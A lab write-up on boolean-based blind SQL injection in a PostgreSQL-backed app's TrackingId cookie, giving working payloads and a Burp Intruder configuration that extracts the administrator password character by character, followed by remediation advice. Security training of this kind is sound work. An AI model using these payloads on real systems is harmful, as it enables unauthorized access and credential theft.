# Lab: Blind SQL Injection with Conditional Responses

| **Category** | SQL Injection (SQLi) |
| :--- | :--- |
| **Type** | Blind (Boolean-Based) |
| **Database** | PostgreSQL |
| **Tool Used** | Burp Suite Professional (Repeater & Intruder) |
| **Status** | ✅ Solved |

---

##  Objective
The goal is to exploit a **Blind SQL Injection** vulnerability in the `TrackingId` cookie to extract the `administrator`'s password from the database and log in. The application does not return SQL errors or data; it only changes the page content ("Welcome back" message) based on whether the query returns TRUE or FALSE.

---

## Discovery & Analysis

### 1. Confirming the Vulnerability
We injected Boolean conditions into the `TrackingId` cookie to observe the application's behavior.

* **TRUE Condition:**
    ```http
    Cookie: TrackingId=xyz' AND 1=1--
    ```
    *Result:* The "Welcome back" message **appears**.
* **FALSE Condition:**
    ```http
    Cookie: TrackingId=xyz' AND 1=0--
    ```
    *Result:* The "Welcome back" message **disappears**.

**Conclusion:** The application is vulnerable to Boolean-based Blind SQLi.

### 2. Database Identification
We tested specific syntaxes to identify the database type.
* Payload: `' AND (SELECT 'a')='a'--` (PostgreSQL syntax).
* *Result:* TRUE response. Confirmed database is **PostgreSQL**.

### 3. Verifying Target Table & User
Before extraction, we confirmed the existence of the `users` table and the `administrator` user.
```sql
' AND (SELECT 'x' FROM users WHERE username='administrator')='x'--
```

## Exploitation (Password Extraction)
### The Strategy
Since i cannot see the password directly, i used the SUBSTRING() function to ask the database yes/no questions for every character of the password.

Query Logic:

``` SQL
SELECT SUBSTRING(password, [Position], 1) FROM users WHERE username='administrator'
```
### Automation via Burp Intruder (Cluster Bomb)
Instead of checking manually, I used Burp Intruder's Cluster Bomb attack type to iterate through character positions and character values simultaneously.

.Injection Point:

``` Plaintext
Cookie: TrackingId=xyz' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§'--
```
### Payload Configuration:

Payload 1 (Position): Numbers 1 to 20 (Iterating through the password length).

Payload 2 (Character): Simple List a-z and 0-9.

Encoding: URL-Encoding disabled for the payload (critical step).

**Grep Match:**

Filtered responses containing the string: "Welcome back".

**Result**
The attack successfully reconstructed the 20-character alphanumeric password by identifying which requests returned a TRUE response.

## Remediation (How to Fix)
To prevent this vulnerability, the application code should be patched using the following methods:

**1.Parameterized Queries (Prepared Statements):** Use PreparedStatement in Java (or equivalent in other languages) to ensure user input is treated as data, not executable code.

Vulnerable: String query = "SELECT * FROM tracking WHERE id = '" + trackingId + "'";

Secure: String query = "SELECT * FROM tracking WHERE id = ?";

**2.Input Validation:** Validate that the TrackingId cookie only contains expected characters (e.g., alphanumeric only) and strictly reject any input containing SQL characters like ' or --.

Documented by: *riyaz*